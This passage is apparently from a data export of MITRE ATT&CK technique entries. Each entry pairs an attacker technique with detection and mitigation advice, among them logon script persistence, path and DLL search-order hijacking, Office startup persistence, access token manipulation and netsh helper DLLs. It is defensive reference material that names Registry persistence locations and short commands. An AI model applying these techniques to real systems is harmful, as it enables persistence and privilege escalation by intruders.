Evasion'],Technique/T1036,['Masquerading'],https://attack.mitre.org/wiki/Technique/T1036
1498,['Monitor logon scripts for unusual access by abnormal users or at abnormal times. Look for files added or modified by unusual accounts outside of normal administration duties.'],[],['564'],[],"['File monitoring', 'Process monitoring']","['===Windows===\n\nWindows allows logon scripts to be run whenever a specific user or group of users log into a system.[[CiteRef::TechNet Logon Scripts]] The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.\n\nIf adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.\n\n===Mac===\n\nMac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root[[CiteRef::creating login hook]]. There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.']",[],[],[],['Restrict write access to logon scripts to specific administrators. Prevent access to administrator accounts by mitigating [[Credential Access]] techniques and limiting account access and permissions of [[Technique/T1078|Valid Accounts]].\n\nIdentify and block potentially malicious software that may be executed through logon script modification by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown programs.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",[],['Write access to system or domain logon scripts'],[],"['Lateral Movement', 'Persistence']",Technique/T1037,['Logon Scripts'],https://attack.mitre.org/wiki/Technique/T1037
1499,"['Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as ""findstr,"" ""net,"" and ""python""). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious. \n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].']",[],['159'],['Stefan Kanthak'],"['File monitoring', 'Process monitoring']","['Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [[Software/S0106|cmd]] in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function.[[CiteRef::TechNet MS14-019]]\n\nThere are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.\n\n===Unquoted Paths===\nService paths (stored in Windows Registry keys)[[CiteRef::Microsoft Subkey]] and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>""C:\\safe path with space\\program.exe""</code>).[[CiteRef::Baggett 2012]] An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program.\n\n===PATH Environment Variable Misconfiguration===\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if <code>C:\\example path</code> precedes <code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.\n\n===Search Order Hijacking===\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program.[[CiteRef::Microsoft CreateProcess]][[CiteRef::Hill NT Shell]][[CiteRef::Microsoft WinExec]] However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program\'s directory.\n\nFor example, ""example.exe"" runs ""cmd.exe"" with the command-line argument <code>net user</code>. An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then <code>cmd.exe /C net user</code> will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.[[CiteRef::MSDN Environment Property]]\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [[Technique/T1038|DLL Search Order Hijacking]].']",[],[],[],"['Eliminate path interception weaknesses in program configuration files, scripts, the PATH environment variable, services, and in shortcuts by surrounding PATH variables with quotation marks when functions allow for them[[CiteRef::Microsoft CreateProcess]]. Be aware of the search order Windows uses for executing or loading binaries and use fully qualified paths wherever appropriate[[CiteRef::MSDN DLL Security]]. Clean up old Windows Registry keys when software is uninstalled to avoid keys with no associated legitimate binaries.\n\nPeriodically search for and correct or report path interception weaknesses on systems that may have been introduced using custom or available tools that report software using insecure path configurations[[CiteRef::Kanthak Sentinel]]. \n\nRequire that all executables be placed in write-protected directories. Ensure that proper permissions and directory access control are set to deny users the ability to write files to the top-level directory <code>C:</code> and system directories, such as <code>C:\\Windows\\</code>, to reduce places where malicious files could be placed for execution.\n\nIdentify and block potentially malicious software that may be executed through the path interception by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies,[[CiteRef::Corio 2008]] that are capable of auditing and/or blocking unknown executables.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],"['Persistence', 'Privilege Escalation']",Technique/T1034,['Path Interception'],https://attack.mitre.org/wiki/Technique/T1034
1500,"['Changes to service Registry entries and command-line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [[Software/S0029|PsExec]].']",[],[],[],"['Process command-line parameters', 'Process monitoring', 'Windows Registry']","['Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with [[Technique/T1050|New Service]] and [[Technique/T1031|Modify Existing Service]] during service persistence or privilege escalation.']",[],[],[],"['Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level. Also ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to interact with Windows services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],[],['Execution'],Technique/T1035,['Service Execution'],https://attack.mitre.org/wiki/Technique/T1035
1501,"['Follow best practices for detecting adversary use of [[Technique/T1078|Valid Accounts]] for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.']",[],[],['Daniel Oakley'],['Authentication logs'],"['Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services.\n\nAdversaries may use remote services to access and persist within a network.[[CiteRef::Volexity Virtual Private Keylogging]] Access to [[Technique/T1078|Valid Accounts]] to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as part of [[Technique/T1108|Redundant Access]] during an operation.']",[],[],[],"[""Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems. Deny direct remote access to internal systems through uses of network proxies, gateways, and firewalls as appropriate. Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of [[Technique/T1111|Two-Factor Authentication Interception]] techniques for some two-factor authentication implementations.""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],['Persistence'],Technique/T1133,['External Remote Services'],https://attack.mitre.org/wiki/Technique/T1133
1502,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],"['Itzik Kotler, SafeBreach']","['Packet capture', 'Process use of network', 'Process Monitoring', 'Network protocol analysis']","['Command and control (C2) information is encoded using a standard data encoding system. Use of data encoding may be to adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding systems.[[CiteRef::Wikipedia Binary-to-text Encoding]][[CiteRef::Wikipedia Character Encoding]] Some data encoding systems may also result in data compression, such as gzip.']",[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Command and Control'],Technique/T1132,['Data Encoding'],https://attack.mitre.org/wiki/Technique/T1132
1503,"['Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious. Disallow loading of remote DLLs.[[CiteRef::Microsoft DLL Preloading]]']",['Process whitelisting'],['471'],['Stefan Kanthak'],"['File monitoring', 'DLL monitoring', 'Process command-line parameters', 'Process monitoring']","['Windows systems use a common method to look for required DLLs to load into a program.[[CiteRef::Microsoft DLL Search]] Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform DLL preloading, also called binary planting attacks,[[CiteRef::OWASP Binary Planting]] by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.[[CiteRef::Microsoft 2269637]] Adversaries may use this behavior to cause the program to load a malicious DLL. \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation.[[CiteRef::Microsoft DLL Redirection]][[CiteRef::Microsoft Manifests]][[CiteRef::Mandiant Search Order]]\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\n\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.']",[],[],[],['Use auditing tools capable of detecting DLL search order hijacking opportunities on systems within an enterprise and correct them. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for DLL hijacking weaknesses.[[CiteRef::Powersploit]]\n\nIdentify and block potentially malicious software that may be executed through search order hijacking by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown DLLs.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']","['Ability to add a DLL, manifest file, or .local file, directory, or junction.']",[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",Technique/T1038,['DLL Search Order Hijacking'],https://attack.mitre.org/wiki/Technique/T1038
1504,['Monitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to [[Exfiltration]].\n\nAdversaries may search network shares on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [[Software/S0106|cmd]] may be used to gather information.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from a network share, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access network shared drive'],[],['Collection'],Technique/T1039,['Data from Network Shared Drive'],https://attack.mitre.org/wiki/Technique/T1039
1505,"['Many Office-related persistence mechanisms require changes to the Registry and for binaries, files, or scripts to be written to disk or existing files modified to include malicious scripts. Collect events related to Registry key creation and modification for keys that could be used for Office-based persistence. Modification to base templated, like Normal.dotm, should also be investigated since the base templates should likely not contain VBA macros. Changes to the Office macro security settings should also be investigated.\n\nMonitor and validate the Office trusted locations on the file system and audit the Registry entries relevant for enabling add-ins.[[CiteRef::MRWLabs Office Persistence Add-ins]]\n\nNon-standard process execution trees may also indicate suspicious or malicious behavior. Collect process execution information including process IDs (PID) and parent process IDs (PPID) and look for abnormal chains of activity resulting from Office processes. If winword.exe is the parent process for suspicious processes and activity relating to other adversarial techniques, then it could indicate that the application was used maliciously.']",[],[],"['Ricardo Dias', 'Loic Jaquemet']","['Process monitoring', 'Process command-line parameters', 'Windows Registry', 'File monitoring']","['Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started.\n\n===Office Template Macros===\n\nMicrosoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.[[CiteRef::Microsoft Change Normal Template]]\n\nOffice Visual Basic for Applications (VBA) macros[[CiteRef::MSDN VBA in Office]] can inserted into the base templated and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.[[CiteRef::enigma0x3 normal.dotm]][[CiteRef::Hexacorn Office Template Macros]]\n\nWord Normal.dotm location:<code>C:\\Users\\(username)\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel Personal.xlsb location:<code>C:\\Users\\(username)\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.\n\n===Office Test===\n\nA Registry location was found that when a DLL reference was placed within it the corresponding DLL pointed to by the binary path would be executed every time an Office application is started[[CiteRef::Hexacorn Office Test]]\n\n<code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\n===Add-ins===\n\nOffice add-ins can be used to add functionality to Office programs.[[CiteRef::Microsoft Office Add-ins]]\n\nAdd-ins can also be used to obtain persistence because they can be set to execute code when an Office application starts. There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), and Visual Studio Tools for Office (VSTO) add-ins.[[CiteRef::MRWLabs Office Persistence Add-ins]]']",[],[],[],"['Follow Office macro security best practices suitable for your environment. Disable Office VBA macros from executing. Even setting to disable with notification could enable unsuspecting users to execute potentially malicious macros.[[CiteRef::TechNet Office Macro Security]]\n\nFor the Office Test method, create the Registry key used to execute it and set the permissions to ""Read Control"" to prevent easy access to the key without administrator permissions or requiring [[Privilege Escalation]].[[CiteRef::Palo Alto Office Test Sofacy]]\n\nDisable Office add-ins. If they are required, follow best practices for securing them by requiring them to be signed and disabling user notification for allowing add-ins. For some add-ins types (WLL, VBA) additional mitigation is likely required as disabling add-ins in the Office Trust Center does not disable WLL nor does it prevent VBA code from executing.[[CiteRef::MRWLabs Office Persistence Add-ins]]']","['Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']","['Office Test technique: Office 2007, 2010, 2013, 2015 and 2016\nAdd-ins: some require administrator permissions']",[],['Persistence'],Technique/T1137,['Office Application Startup'],https://attack.mitre.org/wiki/Technique/T1137
1506,['Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller.[[CiteRef::Microsoft User Creation Event]] Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.'],[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Authentication logs', 'Windows event logs']",['Adversaries with a sufficient level of access may create a local system or domain account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.\n\nThe <code>net user</code> commands can be used to create a local or domain account.'],[],[],[],['Use and enforce multifactor authentication. Follow guidelines to prevent or limit adversary access to [[Technique/T1078|Valid Accounts]] that may be used to create privileged accounts within an environment.\n\nAdversaries that create local accounts on systems may have limited access within a network if access levels are properly locked down. These accounts may only be needed for persistence on individual systems and their usefulness depends on the utility of the system they reside on.\n\nProtect domain controllers by ensuring proper security configuration for critical servers. Configure access controls and firewalls to limit access to these systems. Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['Administrator'],[],[],['Credential Access'],Technique/T1136,['Create Account'],https://attack.mitre.org/wiki/Technique/T1136
1507,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Process Monitoring', 'Process command-line parameters', 'Network protocol analysis', 'Process use of network']","['Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\n===Windows===\n\nFile sharing over a Windows network occurs over the SMB protocol.[[CiteRef::Wikipedia Shared Resource]][[CiteRef::TechNet Shared Folder]]\n\n[[Software/S0039|Net]] can be used to query a remote system for available shared drives using the <code>net view \\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>.\n\nAdversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for [[Collection]] and to identify potential systems of interest for [[Lateral Movement]].\n\n===Mac===\n\nOn Mac, locally mounted shares can be viewed with the <code>df -aH</code> command.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire network share information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],Technique/T1135,['Network Share Discovery'],https://attack.mitre.org/wiki/Technique/T1135
1508,"['If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity.  Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.[[CiteRef::Microsoft Command-line Logging]]\n\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.  \n\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code>[[CiteRef::Microsoft LogonUser]], <code>DuplicateTokenEx</code>[[CiteRef::Microsoft DuplicateTokenEx]], and <code>ImpersonateLoggedOnUser</code>[[CiteRef::Microsoft ImpersonateLoggedOnUser]]).  Please see the referenced Windows API pages for more information.']",[],[],['Tom Ueltschi @c_APT_ure'],[],"[u'Windows uses access tokens to determine the ownership of a running process.  A user can manipulate access tokens to make a running process appear as though it belongs to someone other than the user that started the process.  When this occurs, the process also takes on the security context associated with the new token.  For example, Microsoft promotes the use of access tokens as a security best practice.  Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command <code>runas</code>. [[CiteRef::Microsoft runas]]\n  \nAdversaries may use access tokens to operate under a different user or system security context to perform actions and evade detection.   An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing.  An adversary must already be in a privileged user context (i.e. administrator) to steal a token.  However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level.[[CiteRef::Pentestlab Token Manipulation]]\n\nAdversaries can also create spoofed access tokens if they know the credentials of a user.  Any standard user can use the <code>runas</code> command, and the Windows API functions, to do this; it does not require access to an administrator account.\n\nLastly, an adversary can use a spoofed token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\n\nMetasploit\u2019s Meterpreter payload allows arbitrary token stealing and uses token stealing to escalate privileges. [[CiteRef::Metasploit access token]]  The Cobalt Strike beacon payload allows arbitrary token stealing and can also create tokens. [[CiteRef::Cobalt Strike Access Token]]']",[],[],[],"['Access tokens are an integral part of the security system within Windows and cannot be turned off.  However, an attacker must already have administrator level access on the local system to make full use of this technique; be sure to restrict users and accounts to the least privileges they require to do their job.\n\nAny user can also spoof access tokens if they have legitimate credentials.  Follow mitigation guidelines for preventing adversary use of [[Technique/T1078|Valid Accounts]].\n\nAlso limit opportunities for adversaries to increase privileges by limiting [[Privilege Escalation]] opportunities.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Privilege Escalation']",Technique/T1134,['Access Token Manipulation'],https://attack.mitre.org/wiki/Technique/T1134
1509,['It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software.[[CiteRef::Demaske Netsh Persistence]]'],[],[],"['Matthew Demaske, Adaptforward']","['Process monitoring', 'DLL monitoring', 'Windows Registry']","[""Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.[[CiteRef::TechNet Netsh]] The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another [[Persistence]] technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe.[[CiteRef::Demaske Netsh Persistence]]\n\nProof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs.[[CiteRef::Github Netsh Helper CS Beacon]]""]",[],[],[],['Identify and block potentially malicious software that may persist in this manner by using whitelisting[[CiteRef::Beechey 2010]] tools capable of monitoring DLL loads by Windows utilities like AppLocker.[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",['[[Software/S0108|netsh]]'],[],['Persistence'],Technique/T1128,['Netsh Helper DLL'],https://attack.mitre.org/wiki/Technique/T1128
1510,"['Monitoring DLL module loads may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances, since benign use of Windows modules load functions are common and may be difficult to distinguish from malicious behavior. Legitimate software will likely only need to load routine, bundled DLL modules or Windows system DLLs such that deviation from known module loads may be suspicious. Limiting DLL module loads to <code>%SystemRoot%</code> and <code>%ProgramFiles%</code> directories will protect against module loads from unsafe paths. \n\nCorrelation of other events with behavior surrounding module loads using API monitoring and suspicious DLLs written to disk will provide additional context to an event that may assist in determining if it is due to malicious behavior.']",[],[],['Stefan Kanthak'],"['Process Monitoring', 'API monitoring', 'File monitoring', 'DLL monitoring']","['The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API.[[CiteRef::Wikipedia Windows Library Files]]\n\nThe module loader can load DLLs:\n\n*via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n*via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n*via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n*via <code><file name=""filename.extension"" loadFrom=""fully-qualified or relative pathname""></code> in an embedded or external ""application manifest"". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries can use this functionality as a way to execute arbitrary code on a system.']",[],[],[],"['Directly mitigating module loads and API calls related to module loads will likely have unintended side effects, such as preventing legitimate software from operating properly. Efforts should be focused on preventing adversary tools from running earlier in the chain of activity and on identifying and correlated subsequent behavior to determine if it is the result of malicious activity.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],['Execution'],Technique/T1129,['Execution through Module Load'],https://attack.mitre.org/wiki/Technique/T1129
1511,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],[],['Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.'],[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about peripheral devices, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 